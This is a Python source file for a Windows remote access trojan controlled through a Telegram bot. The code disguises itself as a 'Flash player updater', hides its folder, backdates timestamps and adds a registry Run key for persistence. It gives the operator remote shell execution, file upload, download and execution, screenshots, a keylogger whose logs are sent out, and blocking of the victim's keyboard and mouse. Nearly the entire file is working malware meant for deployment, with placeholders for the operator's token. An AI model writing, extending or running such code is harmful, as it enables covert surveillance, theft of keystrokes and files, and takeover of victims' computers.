import os
import sys
import time
import shutil
import winreg
import getpass
import telepot
import requests
import win32api
import winshell
import threading
import subprocess
import ctypes
from PIL import ImageGrab
from telepot.loop import MessageLoop
from pynput.keyboard import Listener

class RAT:
    def __init__(self, bot, trusted_users, trusted_chats):
        self.bot = bot
        self.trusted_users = trusted_users
        self.trusted_chats = trusted_chats
        self.keylogger_active = False
        self.keylogger_thread = None
        self.keylogger_file = "keylog.txt"

        try:
            if sys.argv[1] == "--quiet":
                pass
        except IndexError:
            self.set_autorun()

        MessageLoop(self.bot, self.bot_handler).run_as_thread()
        print("Bot connected.")
        for chat in self.trusted_chats:
            self.bot.sendMessage(chat, "🤖 Bot connected.")
        for user in self.trusted_users:
            self.bot.sendMessage(user, "🤖 Bot connected.")

        while True:
            time.sleep(10)

    def set_autorun(self):
        """
        This function sets the script to run at startup on Windows.
        """
        application = sys.argv[0]
        start_path = os.path.join(os.path.abspath(os.getcwd()), application)
        copy2_path = os.path.join(winshell.my_documents(), "Adobe flash player")
        copy2_app = os.path.join(copy2_path, "Flash player updater.exe")

        if not os.path.exists(copy2_path):
            os.makedirs(copy2_path)

        try:
            win32api.CopyFile(start_path, copy2_app)
            win32api.SetFileAttributes(copy2_path, 2)
            os.utime(copy2_app, (1282372620, 1282372620))
            os.utime(copy2_path, (1282372620, 1282372620))

            startup_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_val, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key2change, 'Flash player updater', 0, winreg.REG_SZ, start_path + " --quiet")
        except Exception as e:
            print(f"Error in set_autorun: {e}")

    def bot_handler(self, message):
        print(message)

        user_id = message["from"]["id"]
        chat_id = message["chat"]["id"]

        if user_id not in self.trusted_users and chat_id not in self.trusted_chats:
            self.bot.sendMessage(chat_id, ":D")
            return

        try:
            args = message["text"].split()
            command = args[0]
        except KeyError:
            if "document" in message:
                self.handle_file_upload(message)
            elif "photo" in message:
                self.handle_file_upload(message)
            return

        command_handlers = {
            "/help": self.send_help,
            "/cmd": self.execute_command,
            "/run": self.run_program,
            "/pwd": self.print_working_directory,
            "/ls": self.list_directory,
            "/cd": self.change_directory,
            "/screen": self.take_screenshot,
            "/download": self.download_file,
            "/keylogger": self.toggle_keylogger,
            "/blockinput": self.block_input,
        }

        if command in command_handlers:
            command_handlers[command](chat_id, args)
        else:
            self.bot.sendMessage(chat_id, "Unknown command. Type /help to see the list of commands.")

    def handle_file_upload(self, message):
        chat_id = message["chat"]["id"]
        try:
            if "document" in message:
                file_id = message["document"]["file_id"]
                file_name = message["document"]["file_name"]
            elif "photo" in message:
                file_id = message["photo"][-1]["file_id"]
                file_name = f"{file_id}.jpg"
            else:
                return

            file_path = self.bot.getFile(file_id)['file_path']
            link = f"https://api.telegram.org/file/bot{self.bot.token}/{file_path}"
            response = requests.get(link, stream=True)
            save_path = os.path.join(os.getcwd(), file_name)

            with open(save_path, "wb") as out_file:
                shutil.copyfileobj(response.raw, out_file)

            self.bot.sendMessage(chat_id, f"File '{file_name}' uploaded successfully.")
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Failed to upload file: {e}")

    def send_help(self, chat_id, args):
        help_text = """
/help - Show this help message
/cmd <command> - Execute a shell command
/run <program> - Run a program
/pwd - Print working directory
/ls [path] - List directory contents
/cd <path> - Change directory
/screen - Take a screenshot
/download <file> - Download a file
/keylogger - Start/stop the keylogger
/blockinput <seconds> - Block mouse and keyboard input
        """
        self.bot.sendMessage(chat_id, help_text)

    def execute_command(self, chat_id, args):
        if len(args) < 2:
            self.bot.sendMessage(chat_id, "Usage: /cmd <command>")
            return
        try:
            result = subprocess.check_output(' '.join(args[1:]), shell=True, stderr=subprocess.STDOUT)
            self.bot.sendMessage(chat_id, result.decode('utf-8', errors='ignore'))
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error executing command: {e}")

    def run_program(self, chat_id, args):
        if len(args) < 2:
            self.bot.sendMessage(chat_id, "Usage: /run <program>")
            return
        try:
            subprocess.Popen(args[1:], shell=True)
            self.bot.sendMessage(chat_id, "Program started.")
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error running program: {e}")

    def print_working_directory(self, chat_id, args):
        try:
            self.bot.sendMessage(chat_id, os.getcwd())
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error getting current directory: {e}")

    def list_directory(self, chat_id, args):
        path = args[1] if len(args) > 1 else "."
        try:
            self.bot.sendMessage(chat_id, '\n'.join(os.listdir(path)))
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error listing directory: {e}")

    def change_directory(self, chat_id, args):
        if len(args) < 2:
            self.bot.sendMessage(chat_id, "Usage: /cd <path>")
            return
        try:
            os.chdir(args[1])
            self.bot.sendMessage(chat_id, f"Changed directory to {os.getcwd()}")
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error changing directory: {e}")

    def take_screenshot(self, chat_id, args):
        try:
            image = ImageGrab.grab()
            image_path = "screenshot.jpg"
            image.save(image_path)
            with open(image_path, "rb") as f:
                self.bot.sendDocument(chat_id, f)
            os.remove(image_path)
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error taking screenshot: {e}")

    def download_file(self, chat_id, args):
        if len(args) < 2:
            self.bot.sendMessage(chat_id, "Usage: /download <file>")
            return
        file_path = ' '.join(args[1:])
        try:
            with open(file_path, "rb") as f:
                self.bot.sendDocument(chat_id, f)
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error downloading file: {e}")

    def block_input_thread(self, seconds, chat_id):
        user32 = ctypes.windll.user32
        try:
            user32.BlockInput(True)
            self.bot.sendMessage(chat_id, f"Input blocked for {seconds} seconds.")
            time.sleep(seconds)
        except Exception as e:
            self.bot.sendMessage(chat_id, f"An error occurred while blocking input: {e}")
        finally:
            user32.BlockInput(False)
            self.bot.sendMessage(chat_id, "Input unblocked.")

    def block_input(self, chat_id, args):
        if len(args) < 2:
            self.bot.sendMessage(chat_id, "Usage: /blockinput <seconds>")
            return

        try:
            seconds = int(args[1])
            if seconds <= 0:
                self.bot.sendMessage(chat_id, "Please provide a positive number of seconds.")
                return

            thread = threading.Thread(target=self.block_input_thread, args=(seconds, chat_id))
            thread.daemon = True
            thread.start()

        except ValueError:
            self.bot.sendMessage(chat_id, "Invalid number of seconds provided.")
        except Exception as e:
            self.bot.sendMessage(chat_id, f"An error occurred: {e}")

    def keylogger_thread_func(self):
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()
        self.listener.join()

    def on_press(self, key):
        with open(self.keylogger_file, "a") as f:
            f.write(f"{key}")

    def toggle_keylogger(self, chat_id, args):
        if self.keylogger_active:
            self.keylogger_active = False
            if self.listener:
                self.listener.stop()
            self.bot.sendMessage(chat_id, "Keylogger stopped.")

            try:
                with open(self.keylogger_file, "rb") as f:
                    self.bot.sendDocument(chat_id, f)
                os.remove(self.keylogger_file)
            except FileNotFoundError:
                self.bot.sendMessage(chat_id, "Log file not found. It might be empty.")
            except Exception as e:
                self.bot.sendMessage(chat_id, f"Error sending log file: {e}")
        else:
            self.keylogger_active = True
            self.bot.sendMessage(chat_id, "Keylogger started.")
            self.keylogger_thread = threading.Thread(target=self.keylogger_thread_func)
            self.keylogger_thread.daemon = True
            self.keylogger_thread.start()

def main():
    # IMPORTANT: Replace with your bot token and trusted user/chat IDs
    token = "YOUR_BOT_TOKEN"
    trusted_users = []  # e.g., [123456789]
    trusted_chats = []  # e.g., [-1001234567890]

    if token == "YOUR_BOT_TOKEN":
        print("Please replace 'YOUR_BOT_TOKEN' with your actual bot token.")
        sys.exit(1)

    bot = telepot.Bot(token)
    rat = RAT(bot, trusted_users, trusted_chats)

if __name__ == '__main__':
    main()
